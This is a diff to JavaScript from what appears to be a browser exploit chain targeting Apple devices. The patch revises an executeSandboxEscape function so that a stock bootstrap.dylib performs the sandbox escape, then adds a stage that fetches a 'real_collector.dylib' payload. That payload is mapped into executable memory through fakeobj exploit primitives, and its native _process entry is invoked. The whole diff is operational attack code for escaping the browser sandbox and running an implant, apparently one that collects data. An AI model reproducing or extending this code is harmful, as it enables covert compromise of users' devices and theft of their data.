@@ -1414,56 +1414,54 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
         //alert("P.platformState.fixedMachOVal2=" + P.platformState.fixedMachOVal2);
         const g = new MachOPayloadBuilder(platformModule.platformState.fixedMachOVal1, platformModule.platformState.fixedMachOVal2, platformModule.platformState.fixedMachOVal3);
 
-        // ── PATCH: Load custom dylib with dynamic _process lookup ──
-        // Dylib must be pre-truncated to Mach-O proper (no appended data).
-        const _ORIG_PROCESS_OFF = 0x68d8; // hardcoded in B trampoline shellcode
-        const _xhr = new XMLHttpRequest();
-        // 缓存破坏：强制拉最新 real_collector（避免 Safari 一直用 89328B 旧 bootstrap）
-        _xhr.open("GET", "payloads/bootstrap.dylib?v=rc10_" + Date.now(), false);
-        _xhr.overrideMimeType("text/plain; charset=x-user-defined");
-        _xhr.send();
-        const _raw = _xhr.responseText;
-        // Build byte array from x-user-defined response
-        const _buf = new Uint8Array(_raw.length);
-        for (let _i = 0; _i < _raw.length; _i++) _buf[_i] = _raw.charCodeAt(_i) & 0xFF;
-        const _dv = new DataView(_buf.buffer);
-        // Parse LC_SYMTAB to find _process
-        const _ncmds = _dv.getUint32(16, true);
-        let _off = 32, _symtabOff = 0, _nsyms = 0, _strtabOff = 0;
-        for (let _c = 0; _c < _ncmds; _c++) {
-            const _cmd = _dv.getUint32(_off, true);
-            const _cmdsize = _dv.getUint32(_off + 4, true);
-            if (_cmd === 2) { // LC_SYMTAB
-                _symtabOff = _dv.getUint32(_off + 8, true);
-                _nsyms = _dv.getUint32(_off + 12, true);
-                _strtabOff = _dv.getUint32(_off + 16, true);
-            }
-            _off += _cmdsize;
+        // ── PATCH: 只用 stock bootstrap 做沙箱逃逸；collector 成功后另载 ──
+        const _ORIG_PROCESS_OFF = 0x68d8;
+        function _loadDylibBytes(url) {
+            const x = new XMLHttpRequest();
+            x.open("GET", url + (url.indexOf("?") >= 0 ? "&" : "?") + "v=" + Date.now(), false);
+            x.overrideMimeType("text/plain; charset=x-user-defined");
+            x.send();
+            const raw = x.responseText || "";
+            const buf = new Uint8Array(raw.length);
+            for (let i = 0; i < raw.length; i++) buf[i] = raw.charCodeAt(i) & 0xFF;
+            return buf;
         }
-        let _processOff = 0;
-        for (let _i = 0; _i < _nsyms; _i++) {
-            const _nlo = _symtabOff + _i * 16;
-            const _strx = _dv.getUint32(_nlo, true);
-            const _ntype = _buf[_nlo + 4];
-            if ((_ntype & 0x0e) === 0) continue;
-            let _name = "";
-            for (let _j = _strtabOff + _strx; _j < _buf.length && _buf[_j]; _j++)
-                _name += String.fromCharCode(_buf[_j]);
-            if (_name === "_process") {
-                _processOff = _dv.getUint32(_nlo + 8, true);
-                break;
+        function _findProcessOff(buf) {
+            const dv = new DataView(buf.buffer, buf.byteOffset, buf.byteLength);
+            const ncmds = dv.getUint32(16, true);
+            let off = 32, symtabOff = 0, nsyms = 0, strtabOff = 0;
+            for (let c = 0; c < ncmds; c++) {
+                const cmd = dv.getUint32(off, true);
+                const cmdsize = dv.getUint32(off + 4, true);
+                if (cmd === 2) {
+                    symtabOff = dv.getUint32(off + 8, true);
+                    nsyms = dv.getUint32(off + 12, true);
+                    strtabOff = dv.getUint32(off + 16, true);
+                }
+                off += cmdsize;
             }
+            for (let i = 0; i < nsyms; i++) {
+                const nlo = symtabOff + i * 16;
+                const strx = dv.getUint32(nlo, true);
+                const ntype = buf[nlo + 4];
+                if ((ntype & 0x0e) === 0) continue;
+                let name = "";
+                for (let j = strtabOff + strx; j < buf.length && buf[j]; j++)
+                    name += String.fromCharCode(buf[j]);
+                if (name === "_process") return dv.getUint32(nlo + 8, true);
+            }
+            return 0;
         }
-        if (!_processOff) throw new Error("[PATCH] _process symbol not found in dylib");
-        // Convert entire file (already truncated) to oA string
+        // 1) stock bootstrap —— 不要替换成 collector
+        const _bootBuf = _loadDylibBytes("payloads/bootstrap.dylib");
+        let _processOff = _findProcessOff(_bootBuf) || _ORIG_PROCESS_OFF;
         const _origLen = g.oA.length;
         let _oA = "";
-        for (let _i = 0; _i < _buf.length; _i += 2)
-            _oA += String.fromCharCode(_buf[_i] | ((_buf[_i + 1] || 0) << 8));
+        for (let i = 0; i < _bootBuf.length; i += 2)
+            _oA += String.fromCharCode(_bootBuf[i] | ((_bootBuf[i + 1] || 0) << 8));
         g.oA = _oA;
-        window.log("[PATCH] Loaded bootstrap.dylib: " + _buf.length + "B, oA=" + _oA.length +
+        window.log("[PATCH] Loaded stock bootstrap: " + _bootBuf.length + "B, oA=" + _oA.length +
             " (orig " + _origLen + "), _process=0x" + _processOff.toString(16));
-        // ── END PATCH (redirect applied after buffer is built, below) ──
 
         let dylibSize = (g.length() + 0x1000 & 0xfffff000) >>> 0;
         const dylibSizeWithSomeExtraSize = dylibSize + 0x200000,
@@ -1475,31 +1473,27 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
         dylibSize = 2 * dylibBufferEncoded.length;
         const dylibBuffer = window.PhZuiP = new Uint32Array(new ArrayBuffer(dylibSize));
         for (let i = 0; i < dylibSize; i += 4) dylibBuffer[i / 4] = utilityModule.readU16FromString(dylibBufferEncoded, i) >>> 0;
-        // ── PATCH: If _process moved, write a B redirect at the hardcoded offset ──
         if (_processOff !== _ORIG_PROCESS_OFF) {
             const _branchDist = (_processOff - _ORIG_PROCESS_OFF) >> 2;
-            const _branchInstr = 0x14000000 | (_branchDist & 0x3FFFFFF);
+            const _branchInstr = (0x14000000 | (_branchDist & 0x3FFFFFF)) >>> 0;
             dylibBuffer[_ORIG_PROCESS_OFF >> 2] = _branchInstr;
-            window.log("[PATCH] Redirect: wrote B at 0x" + _ORIG_PROCESS_OFF.toString(16) +
-                " -> 0x" + _processOff.toString(16) +
-                " (instr=0x" + _branchInstr.toString(16) + ")");
+            window.log("[PATCH] Redirect: B @0x" + _ORIG_PROCESS_OFF.toString(16) +
+                " -> 0x" + _processOff.toString(16));
         } else {
-            window.log("[PATCH] _process at original offset 0x" + _ORIG_PROCESS_OFF.toString(16) + ", no redirect needed");
+            window.log("[PATCH] _process at original 0x" + _ORIG_PROCESS_OFF.toString(16) + ", no redirect");
         }
-        //window.addDownloadBinary("lzwDecoded.dylib", new Uint32Array(dylibBuffer.slice(0)));
         const dylibLoadAddressI64 = utilityModule.Int64.fromNumber(dylibLoadAddress),
             dylibDataAddressMaybe = utilityModule.Int64.fromNumber(platformModule.platformState.exploitPrimitive.fakeobj(dylibBuffer));
         window.log("dylib load address: 0x" + dylibLoadAddress.toString(16));
         window.log("data address?: 0x" + dylibDataAddressMaybe.toNumber().toString(16));
-        window.log("dylib size: 0x" + dylibSize);
+        window.log("dylib size: 0x" + dylibSize.toString(16));
         platformModule.platformState.sandboxEscape.Ad(dylibLoadAddressI64, dylibDataAddressMaybe, dylibSize);
         const T = g.YA().ct() + 4;
-        //alert("D 0x" + T.toString(16));
-        // 共享内存链：暴露 buffer + _process 入口，供 JS 重入
         window.__stage3Buffer = (A && A.buffer) ? A.buffer : A;
         window.__stage3Ctrl = A;
-        window.__stage3ProcessEntry = T; // absolute entry of _process
+        window.__stage3ProcessEntry = T;
         window.__stage3DylibLoad = dylibLoadAddress;
+        window.__stage3UseNative = false;
         try {
             platformModule.platformState.sharedBuffer = window.__stage3Buffer;
             platformModule.platformState.stage3Ctrl = A;
@@ -1507,7 +1501,60 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
         } catch (e) {}
         window.log("[STAGE3] shared buffer ready bytes=" + (window.__stage3Buffer && window.__stage3Buffer.byteLength) +
             " processEntry=0x" + (T >>> 0).toString(16));
-        // 重入 _process：绝不清空缓冲（旧 reenter 会抹掉已喂 F00DBEEF）
+
+        // 2) 成功后另载 real_collector（不替换 bootstrap）
+        window.__stage3LoadCollector = function () {
+            try {
+                const cbuf = _loadDylibBytes("payloads/real_collector.dylib");
+                const coff = _findProcessOff(cbuf);
+                if (!coff) {
+                    window.log("[COLLECTOR] _process not found in real_collector.dylib");
+                    return false;
+                }
+                // 按 4 字节对齐拷到可执行页
+                let csize = (cbuf.length + 0x1000) & ~0xfff;
+                if (csize < 0x10000) csize = 0x10000;
+                const cload = platformModule.platformState.sandboxEscape
+                    .newInt64OfSomething(csize + 0x200000).toPointerValue();
+                const cwords = new Uint32Array(new ArrayBuffer(csize));
+                for (let i = 0; i + 3 < cbuf.length; i += 4) {
+                    cwords[i >> 2] = cbuf[i] | (cbuf[i + 1] << 8) | (cbuf[i + 2] << 16) | (cbuf[i + 3] << 24);
+                }
+                const cloadI64 = utilityModule.Int64.fromNumber(cload);
+                const cdata = utilityModule.Int64.fromNumber(
+                    platformModule.platformState.exploitPrimitive.fakeobj(cwords)
+                );
+                platformModule.platformState.sandboxEscape.Ad(cloadI64, cdata, csize);
+                const nentry = cload + coff;
+                window.__stage3CollectorLoad = cload;
+                window.__stage3NativeEntry = nentry;
+                window.__stage3ProcessOff = coff;
+                window.log("[COLLECTOR] mapped size=" + csize + " load=0x" + (cload >>> 0).toString(16) +
+                    " _process=0x" + coff.toString(16) + " entry=0x" + (nentry >>> 0).toString(16));
+                // 直调 process(shared_buffer)
+                const bp = A.CA || A.IA;
+                if (!bp) {
+                    window.log("[COLLECTOR] no shared buffer ptr");
+                    return false;
+                }
+                const rr = platformModule.platformState.caller.jd(
+                    utilityModule.Int64.fromNumber(nentry),
+                    utilityModule.Int64.fromNumber(bp)
+                );
+                const code = rr && typeof rr.Pt === "function" ? rr.Pt() : rr;
+                const d0 = A.buffer[0] >>> 0;
+                const sz = A.buffer[1] >>> 0;
+                window.log("[COLLECTOR] process ret=" + code + " D0=" + d0 + " size=" + sz);
+                // 后续 kick 可走 collector
+                window.__stage3ProcessEntry = nentry;
+                window.__stage3UseNative = true;
+                return true;
+            } catch (e) {
+                window.log("[COLLECTOR] load/run error: " + e);
+                return false;
+            }
+        };
+
         window.__stage3ProcessBusy = false;
         window.__stage3KickProcess = function (reason) {
             try {
@@ -1523,29 +1570,37 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
                 const buf = window.__stage3Buffer;
                 const d0 = buf && buf[0] != null ? (buf[0] >>> 0) : -1;
                 const sz = buf && buf[1] != null ? (buf[1] >>> 0) : -1;
-                // 只在 READY(3) 或 IDLE(0)+有效载荷 时 kick
-                // 禁止 URL(1)/DL(2)/POST(7) 中途重入（会把 size 打成垃圾并重下 master）
                 const maxSz = (buf && buf.length ? (buf.length * 4 - 8) : (LA - 8));
                 const sizeOk = sz > 8 && sz < maxSz && sz < 0x1000000;
-                if (d0 === 1 || d0 === 2 || d0 === 7 || d0 === 6) {
+                if (d0 === 1 || d0 === 2 || d0 === 7) {
                     window.log("[STAGE3] kick skip state=" + d0 + " reason=" + reason + " size=" + sz);
                     try { if (window.__stage3Ctrl && window.__stage3Ctrl.start) window.__stage3Ctrl.start(); } catch (eS0) {}
                     return false;
                 }
-                if (!(d0 === 3 || d0 === 0) || !sizeOk) {
+                // collector FEED(6) 允许
+                if (!(d0 === 3 || d0 === 0 || (window.__stage3UseNative && d0 === 6)) || (!sizeOk && d0 !== 6)) {
                     window.log("[STAGE3] kick skip bad D0/size reason=" + reason + " D0=" + d0 + " size=" + sz);
                     return false;
                 }
-                // IDLE 有包时先标 READY
                 if (d0 === 0 && sizeOk) {
                     buf[0] = 3;
                     window.log("[STAGE3] kick promote IDLE→READY size=" + sz);
                 }
-                window.log("[STAGE3] kick _process reason=" + reason + " D0=" + (buf[0] >>> 0) + " size=" + sz);
+                window.log("[STAGE3] kick reason=" + reason + " D0=" + (buf[0] >>> 0) + " size=" + sz +
+                    " entry=0x" + (entry >>> 0).toString(16) + " native=" + !!window.__stage3UseNative);
                 window.__stage3ProcessBusy = true;
                 var code = null;
                 try {
-                    const r = platformModule.platformState.caller.jd(utilityModule.Int64.fromNumber(entry));
+                    var r;
+                    if (window.__stage3UseNative && window.__stage3Ctrl && (window.__stage3Ctrl.CA || window.__stage3Ctrl.IA)) {
+                        const bp = window.__stage3Ctrl.CA || window.__stage3Ctrl.IA;
+                        r = platformModule.platformState.caller.jd(
+                            utilityModule.Int64.fromNumber(entry),
+                            utilityModule.Int64.fromNumber(bp)
+                        );
+                    } else {
+                        r = platformModule.platformState.caller.jd(utilityModule.Int64.fromNumber(entry));
+                    }
                     code = r && typeof r.Pt === "function" ? r.Pt() : r;
                 } finally {
                     window.__stage3ProcessBusy = false;
@@ -1553,7 +1608,6 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
                 const d0b = buf && buf[0] != null ? (buf[0] >>> 0) : -1;
                 const szb = buf && buf[1] != null ? (buf[1] >>> 0) : -1;
                 window.log("[STAGE3] kick done ret=" + code + " D0=" + d0b + " size=" + szb);
-                // URL/POST 交给 wA，不要立刻再 kick
                 try { if (window.__stage3Ctrl && window.__stage3Ctrl.start) window.__stage3Ctrl.start(); } catch (eS) {}
                 return true;
             } catch (err) {
@@ -1565,7 +1619,6 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
         window.__stage3Reenter = function () {
             return window.__stage3KickProcess("reenter");
         };
-        // 先启动 JS 侧 wA，再调 native（避免 URL 请求无人处理）
         try { A.start(); } catch (e0) {}
         window.__stage3ProcessBusy = true;
         var _ret = null;
@@ -1578,10 +1631,18 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
             const d0 = A.buffer[0] >>> 0;
             const sz = A.buffer[1] >>> 0;
             window.log("[STAGE3] first _process ret=" + _ret + " D0=" + d0 + " size=" + sz);
-            // 包已喂但 _process 先返回：强制 READY 再 kick
+            // stock 逃逸成功后再挂 collector
+            if (_ret === 0) {
+                window.log("[STAGE3] escape ok → load real_collector");
+                setTimeout(function () {
+                    try { window.__stage3LoadCollector(); } catch (eC) {
+                        window.log("[COLLECTOR] " + eC);
+                    }
+                }, 80);
+            }
             if (sz > 100 && (d0 === 0 || d0 === 3)) {
                 if (d0 === 0) {
-                    A.buffer[0] = 3; // READY
+                    A.buffer[0] = 3;
                     window.log("[STAGE3] force READY on leftover payload size=" + sz);
                 }
                 setTimeout(function () { window.__stage3KickProcess("post-first"); }, 50);
